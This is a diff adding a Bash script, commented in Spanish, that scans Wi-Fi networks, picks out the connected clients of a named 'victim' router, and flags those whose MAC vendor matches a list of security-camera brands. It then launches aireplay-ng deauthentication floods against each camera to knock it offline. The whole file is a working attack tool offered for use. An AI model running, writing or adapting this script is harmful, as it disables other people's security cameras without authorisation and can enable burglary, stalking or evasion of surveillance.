@@ -1,0 +1,151 @@
+#!/bin/bash
+DEV=$1
+VICTIM=$2
+marcas_camaras=(
+  "Hikvision"
+  "Dahua"
+  "Bosch"
+  "Axis"
+  "Samsung"
+  "Panasonic"
+  "Vivotek"
+  "Avigilon"
+  "Lorex"
+  "Reolink"
+  "TP-Link"
+  "Tapo"
+  "Ezviz"
+  "Xiaomi"
+  "Wyze"
+)
+
+
+
+
+
+if [ -z "$DEV" ]; then
+  echo "Error: No se especificó el dispositivo. Ejemplo de uso: bash script.sh wlan0 VICTIMA"
+  exit 1
+fi
+
+if [ -z "$VICTIM" ]; then
+  echo "Advertencia: No se especificó la víctima. Solo se escanearán las redes WiFi."
+fi
+
+# Iniciar modo monitor en la interfaz de red
+echo "Iniciando modo monitor en $DEV..."
+airmon-ng start "$DEV"
+
+sleep 2  # Esperar a que el modo monitor se active correctamente
+
+# Escanear redes WiFi y guardar la salida en CSV
+echo "Escaneando redes WiFi durante 20 segundos..."
+timeout 20 airodump-ng --write scanWifi --output-format csv wlan0mon &
+
+PID=$!
+sleep 1  # Dar tiempo al proceso para iniciarse
+wait $PID
+
+# Verificar si el archivo de escaneo fue creado correctamente
+if [ ! -f "scanWifi-01.csv" ]; then
+  echo "Error: No se generó el archivo scanWifi-01.csv"
+  airmon-ng stop wlan0mon
+  exit 1
+fi
+
+# Obtener la MAC y el canal del router víctima
+MAC=$(grep -i "$VICTIM" scanWifi-01.csv | awk '{print $1}' | sed 's/,//g')
+CHANEL=$(grep -i "$VICTIM" scanWifi-01.csv | awk '{print $6}' | sed 's/,//g')
+echo "$MAC"
+echo "$CHANEL"
+rm -rf scanWifi-01.csv  # Limpiar el archivo de escaneo
+
+if [ -z "$MAC" ] || [ -z "$CHANEL" ]; then
+  echo "Error: No se pudo obtener la MAC o el canal del router víctima."
+  airmon-ng stop wlan0mon
+  exit 1
+fi
+
+echo "Victim Router MAC: $MAC"
+
+# Iniciar captura enfocada en la víctima
+echo "Iniciando escaneo enfocado en la víctima..."
+timeout 20 airodump-ng --bssid "$MAC" -c "$CHANEL" --write "$VICTIM" --output-format csv wlan0mon &
+
+PID=$!
+sleep 1
+wait $PID
+
+# Verificar si el archivo de la víctima fue generado
+VICTIM_CSV="${VICTIM}-01.csv"
+if [ ! -f "$VICTIM_CSV" ]; then
+  echo "Error: No se generó el archivo $VICTIM_CSV"
+  airmon-ng stop wlan0mon
+  exit 1
+fi
+
+# Extraer dispositivos conectados al router víctima
+echo "Analizando dispositivos conectados..."
+CAMS=()
+LIST=$(grep -i "$MAC" "$VICTIM_CSV" | awk '{print $1}' | sed 's/,//g' | sed "s/$MAC//g")
+
+for line in $LIST; do
+    echo -e "\nProcesando: $line"
+    RES=$(curl -s https://api.macvendors.com/"$line")
+
+    # Si no se encuentra el dato, no hacer nada
+    if ! echo "$RES" | grep -qi "Not Found"; then
+        echo "$RES"
+        for marca in "${marcas_camaras[@]}"; do
+            if [[ "$RES" == *"$marca"* ]]; then
+                echo "✅ Coincide $line con marca: $marca"
+                CAMS+=("$line")
+                break  # opcional: salta al siguiente MAC si ya coincidió
+            fi
+        done
+    fi
+
+    sleep 1
+done
+
+# Mostrar las MACs detectadas como cámaras
+echo -e "\n📷 Dispositivos identificados como cámaras:"
+printf '%s\n' "${CAMS[@]}"
+
+# Función que se ejecutará cuando presiones Ctrl+C
+cleanup() {
+    echo -e "\n🛑 Deteniendo todos los procesos aireplay-ng..."
+    pkill -f aireplay-ng
+    exit 1
+}
+
+# Capturar Ctrl+C (SIGINT)
+trap cleanup SIGINT
+
+echo -e "\n📷 Dispositivos identificados como cámaras:"
+printf '%s\n' "${CAMS[@]}"
+
+for cam in "${CAMS[@]}"; do
+    aireplay-ng --deauth 100 -a "$MAC" -c "$cam" wlan0mon &
+done
+
+wait  # Espera a que todos terminen
+
+
+
+
+# Eliminar archivo de captura
+rm -f "$VICTIM_CSV"
+
+# Detener modo monitor
+echo "Deteniendo modo monitor..."
+airmon-ng stop wlan0mon
+
+if [ $? -eq 0 ]; then
+  echo "Modo monitor detenido correctamente."
+else
+  echo "Hubo un problema al detener el modo monitor."
+fi
+
+exit 0
+
